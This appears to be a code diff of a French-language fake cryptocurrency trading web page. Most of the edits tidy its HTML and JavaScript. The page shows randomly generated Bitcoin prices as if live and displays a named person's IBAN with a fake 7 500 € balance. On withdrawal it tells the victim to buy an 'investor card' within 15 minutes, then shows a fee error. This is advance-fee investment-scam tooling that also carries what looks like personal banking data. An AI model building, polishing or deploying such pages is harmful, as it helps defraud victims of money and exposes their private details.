@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Trading Investissement - Crypto Trading</title>
-    <link rel="stylesheet" href="styles.css"> <!-- External CSS for better organization -->
+    <link rel="stylesheet" href="styles.css">
     <style>
         body {
             font-family: 'Roboto', sans-serif;
@@ -225,19 +225,20 @@
             padding: 20px 0;
         }
     </style>
-
-    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+    <script src="https://s3.tradingview.com/tv.js"></script>
 </head>
 
 <body>
     <script>
-        let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "FPELFR21XXX") {
-            document.body.style.display = 'block';
-        } else {
-            alert("Numéro incorrect. Accès refusé.");
-            document.body.style.display = 'none';
-        }
+        document.addEventListener('DOMContentLoaded', () => {
+            let code = prompt("Veuillez entrer votre numéro de téléphone :");
+            if (code === "FPELFR21XXX") {
+                document.body.style.display = 'block';
+            } else {
+                alert("Numéro incorrect. Accès refusé.");
+                document.body.style.display = 'none';
+            }
+        });
     </script>
 
     <header>
@@ -256,6 +257,7 @@
             </div>
         </nav>
     </header>
+
     <main>
         <div class="trading-interface">
             <section class="price-info">
@@ -274,7 +276,6 @@
                         <span class="amount">0.19707 BTC</span>
                         <span class="total">13,395.70515 USDT</span>
                     </div>
-                    <!-- Repeat for more orders -->
                 </div>
             </section>
             <section class="actions-container">
@@ -289,10 +290,12 @@
             <section class="error-message" id="error-message"></section>
         </div>
     </main>
+
     <footer>
-        <p>© 2024 Africa Investissement. Tous droits réservés.</p>
+        <p>&copy; 2024 Africa Investissement. Tous droits réservés.</p>
     </footer>
-    <script src="script.js"></script> <!-- External JS for better organization -->
+
+    <script src="script.js"></script>
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             const priceElement = document.querySelector('.price-info .price');
@@ -303,7 +306,7 @@
 
             const updatePrice = () => {
                 const newPrice = (Math.random() * (70000 - 65000) + 65000).toFixed(2);
-                const newVariation = (Math.random() * (2) - 1).toFixed(2);
+                const newVariation = (Math.random() * 2 - 1).toFixed(2);
                 priceElement.textContent = newPrice;
                 variationElement.textContent = `${newVariation}%`;
             };
@@ -313,7 +316,7 @@
             const setWithdrawalInfo = (method) => {
                 const accountName = "MME TAANLIMI MMADI";
                 const accountNumber = "FR76 1659 8000 0129 2557 5000 140";
-                const balance = " 7 500 €";
+                const balance = "7 500 €";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
@@ -333,7 +336,7 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher MMADI, Veuillez acheter votre carte d'\investisseur pour finaliser le processus de transfert des bénéfices dans les 15 minutes.');
+                alert('Cher MMADI, Veuillez acheter votre carte d\'investisseur pour finaliser le processus de transfert des bénéfices dans les 15 minutes.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
                 errorMessage.textContent = 'Erreur : Frais néccéssaire.';
